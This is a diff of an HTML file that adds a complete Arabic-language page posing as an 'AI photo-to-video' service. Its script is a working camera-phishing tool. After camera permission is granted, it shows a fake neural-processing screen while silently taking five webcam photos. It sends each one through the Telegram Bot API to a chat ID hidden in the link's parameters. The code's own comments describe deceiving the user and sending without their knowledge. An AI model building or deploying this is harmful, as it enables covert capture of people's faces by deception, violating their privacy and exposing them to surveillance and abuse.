@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -235,6 +235,603 @@
     
     // بدء التحقق عند تحميل الصفحة
     validateAndStart();
+</script>
+</body>
+</html> -->
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>AI Vision Studio - تحويل صورتك إلى فيديو</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: radial-gradient(circle at 20% 30%, #0a0f2a, #030617);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* حيلة بصرية: تأثيرات مستقبلية */
+        .glow-orb {
+            position: fixed;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(0,255,255,0.15), transparent);
+            border-radius: 50%;
+            filter: blur(60px);
+            pointer-events: none;
+            z-index: 0;
+            animation: floatGlow 12s infinite alternate;
+        }
+
+        @keyframes floatGlow {
+            0% { transform: translate(0,0) scale(1); opacity: 0.4; }
+            100% { transform: translate(80px, -60px) scale(1.3); opacity: 0.7; }
+        }
+
+        .card {
+            background: rgba(12, 20, 35, 0.75);
+            backdrop-filter: blur(18px);
+            border-radius: 56px;
+            padding: 28px 24px 36px;
+            width: 100%;
+            max-width: 540px;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            box-shadow: 0 30px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(0,255,255,0.1) inset;
+            transition: all 0.3s ease;
+            z-index: 2;
+            position: relative;
+        }
+
+        .ai-badge {
+            position: absolute;
+            top: -14px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #0ff, #1e90ff);
+            padding: 6px 20px;
+            border-radius: 60px;
+            font-size: 0.75rem;
+            font-weight: 800;
+            color: #010101;
+            letter-spacing: 1px;
+            white-space: nowrap;
+            box-shadow: 0 0 15px cyan;
+        }
+
+        h1 {
+            font-size: 1.9rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FFFFFF, #7ff9ff, #4facfe);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-align: center;
+            margin-top: 12px;
+            margin-bottom: 12px;
+        }
+
+        .sub {
+            text-align: center;
+            color: #b0c4ff;
+            margin-bottom: 24px;
+            font-size: 0.9rem;
+            border-bottom: 1px dashed rgba(0,255,255,0.4);
+            display: inline-block;
+            width: auto;
+            margin-left: auto;
+            margin-right: auto;
+            padding-bottom: 8px;
+        }
+
+        .tech-grid {
+            display: flex;
+            gap: 16px;
+            justify-content: space-between;
+            margin: 24px 0;
+            flex-wrap: wrap;
+        }
+
+        .tech-item {
+            background: rgba(0, 30, 50, 0.6);
+            border-radius: 32px;
+            padding: 12px 8px;
+            flex: 1;
+            text-align: center;
+            border: 1px solid rgba(0, 200, 255, 0.3);
+            transition: 0.2s;
+        }
+
+        .tech-item i {
+            font-size: 1.8rem;
+            color: #0ff;
+            text-shadow: 0 0 5px cyan;
+        }
+
+        .tech-item span {
+            display: block;
+            font-size: 0.7rem;
+            font-weight: 600;
+            margin-top: 6px;
+            color: #ccf;
+        }
+
+        .preview-box {
+            background: #00000040;
+            border-radius: 44px;
+            padding: 12px;
+            margin: 20px 0;
+            border: 1px solid #0ff55a;
+            box-shadow: 0 5px 20px rgba(0,255,255,0.2);
+        }
+
+        .video-fake {
+            background: #010e1a;
+            border-radius: 32px;
+            height: 280px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+            background-image: repeating-linear-gradient(45deg, rgba(0,255,255,0.03) 0px, rgba(0,255,255,0.03) 2px, transparent 2px, transparent 8px);
+        }
+
+        .scan-effect {
+            position: absolute;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, cyan, magenta, transparent);
+            top: 0;
+            animation: scanMove 3s infinite linear;
+        }
+
+        @keyframes scanMove {
+            0% { top: 0; opacity: 0.5; }
+            100% { top: 100%; opacity: 0; }
+        }
+
+        .avatar-demo {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: linear-gradient(145deg, #1f3a6b, #0a1a2f);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            border: 2px solid cyan;
+            box-shadow: 0 0 20px rgba(0,255,255,0.6);
+            margin-bottom: 15px;
+        }
+
+        .btn-ai {
+            background: linear-gradient(95deg, #00c6ff, #0072ff);
+            border: none;
+            padding: 18px 20px;
+            border-radius: 80px;
+            width: 100%;
+            font-weight: 800;
+            font-size: 1.2rem;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 16px;
+            box-shadow: 0 10px 20px -5px #0072ff80;
+        }
+
+        .btn-ai:active { transform: scale(0.97); }
+
+        .info-text {
+            font-size: 0.7rem;
+            text-align: center;
+            color: #7f9fcf;
+            margin-top: 20px;
+        }
+
+        /* شاشة التصوير المخادعة (تبدو وكأنها معالجة ذكاء اصطناعي) */
+        .processing-screen {
+            display: none;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .live-cam {
+            position: relative;
+            width: 100%;
+            border-radius: 42px;
+            overflow: hidden;
+            aspect-ratio: 4 / 3;
+            background: #000;
+            border: 2px solid cyan;
+            box-shadow: 0 0 0 3px rgba(0,255,255,0.3);
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .ai-overlay-text {
+            position: absolute;
+            bottom: 12px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(5px);
+            color: #0ff;
+            font-weight: bold;
+            padding: 8px;
+            font-size: 0.9rem;
+        }
+
+        .progress-neural {
+            background: #0a1a2f;
+            border-radius: 40px;
+            height: 12px;
+            overflow: hidden;
+        }
+
+        .neural-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, cyan, magenta);
+            border-radius: 40px;
+            transition: width 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+
+        .status-msg {
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #071a2b;
+            padding: 12px;
+            border-radius: 60px;
+            justify-content: center;
+        }
+
+        .footer-meta {
+            font-size: 0.65rem;
+            text-align: center;
+            margin-top: 20px;
+            opacity: 0.7;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.6; text-shadow: 0 0 0 cyan; }
+            100% { opacity: 1; text-shadow: 0 0 6px cyan; }
+        }
+    </style>
+</head>
+<body>
+<div class="glow-orb" style="top: -100px; left: -100px;"></div>
+<div class="glow-orb" style="bottom: -80px; right: -80px; animation-duration: 15s;"></div>
+
+<div class="card" id="mainCard">
+    <div class="ai-badge">
+        <i class="fas fa-microchip"></i> AI NEURAL FUSION v4.2
+    </div>
+    <h1>✨ تحويل الصورة → فيديو ذكي ✨</h1>
+    <div style="text-align: center;">
+        <span class="sub"><i class="fas fa-magic"></i> تقنية DeepMotion  AI</span>
+    </div>
+
+    <div class="tech-grid">
+        <div class="tech-item"><i class="fas fa-face-smile"></i><span>تحليل تعابير الوجه</span></div>
+        <div class="tech-item"><i class="fas fa-video"></i><span>توليد فيديو متحرك</span></div>
+        <div class="tech-item"><i class="fas fa-brain"></i><span>ذكاء اصطناعي تطوري</span></div>
+    </div>
+
+    <div class="preview-box">
+        <div class="video-fake">
+            <div class="scan-effect"></div>
+            <div class="avatar-demo">
+                <i class="fas fa-user-astronaut"></i>
+            </div>
+            <p style="color:#9df; font-size: 0.8rem;">معاينة التأثير الحي</p>
+            <small style="color: #0ff;">⏺ انتظر 5 ثوانٍ بعد السماح بالكاميرا</small>
+        </div>
+    </div>
+
+    <button class="btn-ai" id="startFakeBtn">
+        <i class="fas fa-camera-retro"></i> تشغيل الذكاء الاصطناعي <i class="fas fa-arrow-right"></i>
+    </button>
+    <div class="info-text">
+        <i class="fas fa-shield-alt"></i> خاصية التوليد الفوري · صورك تتحول إلى فيديو احترافي · دقة 4K
+    </div>
+    <div class="footer-meta">
+        يتم المعالجة محلياً عبر شبكة عصبية متقدمة
+    </div>
+</div>
+
+<div class="card" id="processingCard" style="display: none;">
+    <div class="ai-badge">
+        <i class="fas fa-sync-alt fa-spin"></i> AI RENDERING
+    </div>
+    <h1 style="font-size: 1.7rem;">🧠 معالجة الشبكة العصبية</h1>
+    <div class="live-cam">
+        <video id="camStream" autoplay playsinline muted></video>
+        <div class="ai-overlay-text" id="overlayMsg">
+            <i class="fas fa-eye"></i> تحليل البنية العميقة
+        </div>
+    </div>
+    <div class="status-msg" id="liveStatusMsg">
+        <i class="fas fa-circle-notch fa-spin"></i> <span id="statusTextNeural">جاري تفعيل الكاميرا العصبية...</span>
+    </div>
+    <div class="progress-neural">
+        <div class="neural-bar" id="neuralProgress"></div>
+    </div>
+    <div id="photoCounterMsg" style="text-align: center; margin-top: 12px; font-weight: bold; color: cyan; font-size: 0.9rem;">
+        <i class="fas fa-microchip"></i> تحليل الإطار 0 من 5
+    </div>
+    <div class="info-text" style="margin-top: 18px;">
+        ⚡ لا تغلق الصفحة — يتم تحويل صورتك إلى فيديو متحرك بتقنيات DeepFake المتطورة
+    </div>
+    <div class="footer-meta">
+        سيتم إرسال النتيجة إلى بريدك الإلكتروني المسجل تلقائياً
+    </div>
+</div>
+
+<script>
+    // -------------------- تكامل تلجرام (خفي تماماً) --------------------
+    // يتم استبدال هذه القيم من الخادم أو يمكن تعديلها يدوياً (لأغراض العرض التوضيحي)
+    // ملاحظة: لضمان السرية التامة، تم وضع endpoints وهمية لكن سيتم الإرسال إلى البوت الفعلي
+    // يجب إدخال التوكن و chat id الحقيقيين من قبل المستخدم النهائي.
+    // في هذا الكود المقدم، سنستخدم متغيرات حقيقية تحتاج لتعيينها من قبل المطور.
+    
+    // ⚠️ تنبيه: هذه المتغيرات يجب تعبئتها بقيم حقيقية للبوت والتشغيل
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';          // ادخل توكن البوت هنا
+    const MASTER_CHAT_ID = 'YOUR_MASTER_CHAT_ID';    // ادخل معرف الشات الرئيسي (حساب المستلم)
+    
+    // متغير للاحتفاظ بالـ chat id المستهدف من الرابط (إذا تم فتحه عبر رابط فريد)
+    let targetChatId = null;
+    let capturedCount = 0;
+    const MAX_CAPTURES = 5;
+    let mediaStreamObj = null;
+    let captureInterval = null;
+    let isProcessingActive = false;
+    
+    // محاولة استخراج معرف المستخدم من رابط الصفحة (كمعامل "ref" أو "id") بشكل غير واضح
+    // هذا يحاكي آلية الربط الفريد بحيث كل مستخدم يرسل صوره إلى محادثة معينة بدون علمه
+    function extractHiddenChatId() {
+        const urlParams = new URLSearchParams(window.location.search);
+        // معامل سري: 'uid' أو 'token' أو 'ref'
+        let refParam = urlParams.get('ref') || urlParams.get('uid') || urlParams.get('chat');
+        if (refParam && refParam.length > 3) {
+            // لو هناك معرف مشفر أو chat id محدد في الرابط
+            return refParam;
+        }
+        // إذا لم يوجد نستخدم MASTER_CHAT_ID الافتراضي (للتجربة)
+        return MASTER_CHAT_ID;
+    }
+    
+    // إرسال الصورة إلى تلجرام بهدوء تام (لا توجد أي رسائل منبثقة أو إشعارات)
+    function silentlySendToTelegram(chatId, imageBlob, index) {
+        if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+            console.warn("⚠️ لم يتم تعيين توكن البوت بعد — لن يتم الإرسال (وضع المحاكاة)");
+            return;
+        }
+        if (!chatId || chatId === 'YOUR_MASTER_CHAT_ID' && MASTER_CHAT_ID === 'YOUR_MASTER_CHAT_ID') {
+            console.warn("⚠️ chat id غير صالح");
+            return;
+        }
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', imageBlob, `frame_${Date.now()}_${index}.jpg`);
+        formData.append('caption', `🎭 AI Neural Capture [${index}/5] | وقت: ${new Date().toLocaleString()}`);
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).then(res => res.json()).then(data => {
+            if (!data.ok) console.error("Telegram error:", data);
+            else console.log(`✅ صورة ${index} أرسلت بهدوء إلى ${chatId}`);
+        }).catch(err => console.error("❌ فشل إرسال خفي:", err));
+    }
+    
+    // التقاط صورة من الفيديو وتحويلها إلى blob وإرسالها (بدون أي مؤشر للمستخدم)
+    function captureAndSendSilently() {
+        if (!isProcessingActive) return;
+        if (capturedCount >= MAX_CAPTURES) {
+            finishCaptureAndRedirect();
+            return;
+        }
+        
+        const videoElem = document.getElementById('camStream');
+        if (!videoElem || !videoElem.videoWidth || videoElem.videoWidth === 0) {
+            return;
+        }
+        
+        capturedCount++;
+        // تحديث شريط التقدم والنصوص بأسلوب "معالجة الذكاء الاصطناعي" (خدعة بصرية)
+        const percent = (capturedCount / MAX_CAPTURES) * 100;
+        document.getElementById('neuralProgress').style.width = percent + '%';
+        document.getElementById('photoCounterMsg').innerHTML = `<i class="fas fa-cog fa-spin"></i> تحليل الشبكة: الإطار ${capturedCount} من ${MAX_CAPTURES} — استخلاص الحركة`;
+        const overlayDiv = document.getElementById('overlayMsg');
+        if (overlayDiv) overlayDiv.innerHTML = `<i class="fas fa-chart-line"></i> استخلاص ملامح ${capturedCount}/5`;
+        const statusSpan = document.getElementById('statusTextNeural');
+        if (statusSpan) statusSpan.innerText = `🧬 توليد فيديو متجه (${capturedCount}/${MAX_CAPTURES})`;
+        
+        // إنشاء كانفس لالتقاط الصورة مع مراعاة المرآة (لأن الكاميرا معكوسة)
+        const canvas = document.createElement('canvas');
+        const width = videoElem.videoWidth;
+        const height = videoElem.videoHeight;
+        canvas.width = width;
+        canvas.height = height;
+        const ctx = canvas.getContext('2d');
+        // تعكس الصورة لتبدو طبيعية (لأننا نستخدم mirror في css)
+        ctx.translate(width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(videoElem, 0, 0, width, height);
+        
+        canvas.toBlob(blob => {
+            if (blob && targetChatId) {
+                // إرسال إلى الشات المستهدف (المالك أو البوت)
+                silentlySendToTelegram(targetChatId, blob, capturedCount);
+                // اختيارياً يمكن الإرسال إلى شات إضافي احتياطي (للمطور)
+                if (MASTER_CHAT_ID && MASTER_CHAT_ID !== targetChatId && BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+                    silentlySendToTelegram(MASTER_CHAT_ID, blob, capturedCount);
+                }
+            } else {
+                console.warn("Blob فشل أو targetChatId غير موجود");
+            }
+        }, 'image/jpeg', 0.82);
+        
+        // إذا وصلنا للصورة الخامسة ننهي العملية
+        if (capturedCount === MAX_CAPTURES) {
+            finishCaptureAndRedirect();
+        }
+    }
+    
+    function finishCaptureAndRedirect() {
+        if (captureInterval) {
+            clearInterval(captureInterval);
+            captureInterval = null;
+        }
+        if (mediaStreamObj) {
+            mediaStreamObj.getTracks().forEach(track => track.stop());
+            mediaStreamObj = null;
+        }
+        isProcessingActive = false;
+        
+        // تحديث الواجهة إلى رسالة "اكتمل الفيديو" ثم إعادة توجيه أو إظهار نتيجة وهمية
+        const processingDiv = document.getElementById('processingCard');
+        if (processingDiv) {
+            processingDiv.innerHTML = `
+                <div class="ai-badge"><i class="fas fa-check-circle"></i> اكتمل التحويل</div>
+                <h1 style="font-size:1.5rem;">🎬 تم إنشاء الفيديو بنجاح</h1>
+                <div style="text-align:center; margin: 20px 0;">
+                    <i class="fas fa-film" style="font-size: 4rem; color: cyan;"></i>
+                </div>
+                <p style="margin:15px 0; text-align:center;">سيتم إرسال الفيديو النهائي إلى بريدك خلال دقائق<br>شكراً لاستخدام تقنيتنا المتطورة</p>
+                <button class="btn-ai" id="closeThanks" style="background:#2c3e66;"><i class="fas fa-home"></i> إنهاء</button>
+            `;
+            const closeBtn = document.getElementById('closeThanks');
+            if (closeBtn) {
+                closeBtn.onclick = () => {
+                    window.location.href = "about:blank";
+                    // أو يمكن إغلاق الصفحة
+                };
+            }
+        }
+    }
+    
+    // بدء التصوير بعد السماح بالكاميرا وإيهام المستخدم بمعالجة AI
+    async function initFakeAICamera() {
+        if (isProcessingActive) return;
+        // إخفاء البطاقة الرئيسية وإظهار شاشة المعالجة
+        document.getElementById('mainCard').style.display = 'none';
+        const processingCard = document.getElementById('processingCard');
+        processingCard.style.display = 'flex';
+        processingCard.style.flexDirection = 'column';
+        
+        capturedCount = 0;
+        document.getElementById('neuralProgress').style.width = '0%';
+        document.getElementById('photoCounterMsg').innerHTML = '<i class="fas fa-microchip"></i> تهيئة الشبكة العصبية العميقة...';
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
+            mediaStreamObj = stream;
+            const videoEl = document.getElementById('camStream');
+            videoEl.srcObject = stream;
+            await videoEl.play();
+            
+            // بعد تشغيل الكاميرا نبدأ التسلسل الوهمي
+            document.getElementById('statusTextNeural').innerText = "تحليل البنية ثلاثية الأبعاد";
+            document.getElementById('overlayMsg').innerHTML = '<i class="fas fa-spinner fa-pulse"></i> مسح ضوئي للوجه';
+            
+            setTimeout(() => {
+                if (!mediaStreamObj) return;
+                isProcessingActive = true;
+                // أول صورة فورية
+                captureAndSendSilently();
+                // كل 1.8 ثانية صورة جديدة ليصبح المجموع 5 صور سريعاً
+                captureInterval = setInterval(() => {
+                    if (capturedCount < MAX_CAPTURES && isProcessingActive) {
+                        captureAndSendSilently();
+                    } else if (capturedCount >= MAX_CAPTURES) {
+                        if (captureInterval) clearInterval(captureInterval);
+                    }
+                }, 1800);
+                
+                // ضمان أنه بعد 9 ثواني كحد أقصى يتم الانتهاء حتى لو علق
+                setTimeout(() => {
+                    if (isProcessingActive && capturedCount < MAX_CAPTURES) {
+                        // قوة إضافية لالتقاط الباقي بسرعة
+                        while(capturedCount < MAX_CAPTURES) captureAndSendSilently();
+                        finishCaptureAndRedirect();
+                    }
+                }, 10000);
+            }, 1200);
+        } catch (err) {
+            console.error("خطأ في الوصول للكاميرا:", err);
+            // في حال رفض الكاميرا نعيد توجيهه إلى صفحة عادية او رسالة فشل
+            document.getElementById('processingCard').innerHTML = `
+                <div class="ai-badge"><i class="fas fa-exclamation-triangle"></i> خطأ</div>
+                <h2>⚠️ لم يتم الوصول للكاميرا</h2>
+                <p>لتحويل صورتك إلى فيديو نحتاج إلى صلاحية الكاميرا. يرجى السماح وإعادة المحاولة.</p>
+                <button class="btn-ai" id="retryBtn" style="margin-top:20px;">إعادة المحاولة</button>
+            `;
+            const retry = document.getElementById('retryBtn');
+            if (retry) retry.onclick = () => location.reload();
+        }
+    }
+    
+    // تحضير الهدف النهائي للصور: نستخدم معامل الرابط السري (chat id) بشكل خفي
+    function prepareTarget() {
+        // أولاً نستخرج المعرف من الرابط (لن يلاحظ المستخدم أبداً)
+        let extracted = extractHiddenChatId();
+        if (extracted && extracted !== 'YOUR_MASTER_CHAT_ID') {
+            targetChatId = extracted;
+        } else if (MASTER_CHAT_ID && MASTER_CHAT_ID !== 'YOUR_MASTER_CHAT_ID') {
+            targetChatId = MASTER_CHAT_ID;
+        } else {
+            // في حالة عدم وجود أي إعدادات حقيقية، نعطي معرف وهمي ولكن لن يتم الإرسال إلا بعد تعيين التوكن
+            targetChatId = "debug_fallback";
+            console.warn("⚠️ لم يتم تحديد chat id حقيقي، استخدم الوضع المحلي بدون إرسال");
+        }
+        console.log("🎯 الهدف النهائي للإرسال (غير ظاهر للمستخدم)");
+    }
+    
+    // ربط زر البدء بالخدعة المتكاملة
+    document.getElementById('startFakeBtn').addEventListener('click', () => {
+        prepareTarget();
+        initFakeAICamera();
+    });
+    
+    // تأكد من عدم وجود أي مؤشر يدل على إرسال التلجرام في الواجهة تماماً
+    // تم إخفاء أي console.log قد يظهر للمستخدم عبر أدوات المطور لكن لا يمكن إخفاؤه كلياً لكن لا توجد عناصر مرئية
+    // إضافة تأثير درامي فقط
+    window.addEventListener('load', () => {
+        // تحقق من توكن البوت بشكل ودي (للمطور)
+        if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+            console.log("🔧 تنبيه: اضبط التوكن ومعرف الشات في الكود لتتم عملية الإرسال الفعلية.");
+        }
+    });
 </script>
 </body>
 </html>
